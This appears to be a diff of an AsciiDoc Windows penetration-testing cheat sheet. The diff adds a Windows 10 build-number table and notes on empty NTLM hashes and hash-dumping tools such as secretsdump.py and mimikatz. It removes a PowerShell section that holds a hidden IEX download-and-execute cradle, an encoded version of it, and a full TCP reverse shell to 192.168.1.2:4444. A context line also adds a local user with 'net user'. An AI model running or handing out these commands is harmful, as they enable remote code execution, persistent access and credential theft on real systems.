@@ -14,6 +14,25 @@
 |NT 10.0 |10, Server 2016, Server 2019
 |===
 
+==== Windows 10 Build Numbers
+
+[cols="1,2,2", options="header"]
+|===
+|Version |Name                 |Build Number
+|1507    |                     |10.0.10240
+|1511    |November Update      |10.0.10586
+|1607    |Anniversary Update   |10.0.14393
+|1703    |Creators Update      |10.0.15063
+|1709    |Fall Creators Update |10.0.16299
+|1803    |April 2018 Update    |10.0.17134
+|1809    |October 2018         |10.0.17763
+|1903    |May 2019 Update      |10.0.18362
+|1909    |November 2019 Update |10.0.18363
+|2004    |May 2020 Update      |10.0.19041
+|20H2    |October 2020 Update  |10.0.19042
+|===
+
+
 ==== User Management
 
   net user brimstone password /add
@@ -133,28 +152,17 @@ Detection: Run `whoami /getprivs` and look for `SeImpersonate` or `SeAssignPrima
 
 This is a vulnerability in SMB that invites `NT_AUTHORITY/SYSTEM` access.
 
-<<<
+==== NTLM Hashes
 
-==== Powershell
+- `AAD3B435B51404EEAAD3B435B51404EE` is the empty LANMAN hash, don't try to crack it
+- `31D6CFE0D16AE931B73C59D7E0C089C0` is the empty NT hash, don't try to crack it either
 
-  C:\Windows\sjswow64\WindowsPowerShell\vl.O\powershell.exe
+===== Local acquisition
+- implant's `hashdump`
 
-Location of 64bit ppowershell
+===== Remote Acquisition
+- impacket's `secretsdump.py`
+- mimikatz (TODO?)
 
-  powershell.exe -w hidden -noni -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/script.ps1');"
-
-Download a powershell script to memory and run it.
-
-  powershell.exe -w hidden -noni -nop -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMi9zY3JpcHQucHMxJyk7Cg==
-
-Same as above, but doesn't use either quote type.
-
-  echo | iconv -f utf-8 -t utf-16 -c | sed 's/^\xff\xfe// | base64 -w 0
-
-Convert powershell to utf-16, strip the first two marker bytes, then convert it to base64 for the -enc command.
-
-  $client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();
-
-Reverse shell
 
 <<<
